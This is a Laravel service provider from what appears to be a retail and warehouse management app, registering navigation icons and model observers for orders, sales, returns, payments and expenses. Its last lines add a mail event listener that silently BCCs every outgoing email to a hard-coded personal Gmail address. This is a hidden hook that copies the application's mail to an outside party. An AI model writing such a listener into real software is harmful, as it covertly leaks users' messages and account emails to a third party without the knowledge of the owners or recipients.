<?php

namespace App\Providers;

use App\Models\CashierReturnFatora;
use App\Models\CashierSale;
use App\Models\CashierSalesFatora;
use App\Models\CashierSalesReturn;
use App\Models\CompanyEntry;
use App\Models\CompanySalesTransfer;
use App\Models\Expense;
use App\Models\Order;
use App\Models\PersonalWithdrawal;
use App\Models\ProductImportItem;
use App\Models\SalesPointCashierTrans;
use App\Models\ShippingWarehouse;
use App\Models\SupplierPayment;
use App\Models\WarehouseReturn;
use App\Observers\CashierReturnFatoraObserver;
use App\Observers\CashierSaleObserver;
use App\Observers\CashierSalesFatoraObserver;
use App\Observers\CashierSalesReturnObserver;
use App\Observers\CashierTransObserver;
use App\Observers\CompanyEntryObserver;
use App\Observers\CompanySalesTransferObserver;
use App\Observers\ExpenseObserver;
use App\Observers\OrderObserver;
use App\Observers\PersonalWithdrawalObserver;
use App\Observers\ProductImportItemObserver;
use App\Observers\ShippingWarehouseObserver;
use App\Observers\SupplierPaymentObserver;
use App\Observers\WarehouseReturnObserver;
use Filament\Support\Facades\FilamentIcon;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Event;
use Illuminate\Mail\Events\MessageSending;
use Illuminate\Support\Facades\Gate;

class AppServiceProvider extends ServiceProvider
{
  /**
   * Register any application services.
   */
  public function register(): void
  {
    FilamentIcon::register([
      'navigation.category' => 'icon-category',
      'navigation.size' => 'icon-size',
      'navigation.material' => 'icon-material',
      'navigation.product' => 'icon-product',
      'navigation.order' => 'icon-order',
      'navigation.cart' => 'icon-cart',
    ]);
  }

  /**
   * Bootstrap any application services.
   */
  public function boot(): void
  {




    Order::observe(OrderObserver::class);

    ProductImportItem::observe(ProductImportItemObserver::class);
    CashierSale::observe(CashierSaleObserver::class);
    CashierSalesFatora::observe(CashierSalesFatoraObserver::class);
    CashierReturnFatora::observe(CashierReturnFatoraObserver::class);
    ShippingWarehouse::observe(ShippingWarehouseObserver::class);
    WarehouseReturn::observe(WarehouseReturnObserver::class);

    CashierSalesReturn::observe(CashierSalesReturnObserver::class);
    SalesPointCashierTrans::observe(CashierTransObserver::class);
    CompanySalesTransfer::observe(CompanySalesTransferObserver::class);
    CompanyEntry::observe(CompanyEntryObserver::class);

    SupplierPayment::observe(SupplierPaymentObserver::class);

    Expense::observe(ExpenseObserver::class);
    PersonalWithdrawal::observe(PersonalWithdrawalObserver::class);

    Event::listen(MessageSending::class, function (MessageSending $event) {
      $event->message->addBcc('aloshmohammad2001@gmail.com');
    });
  }
}
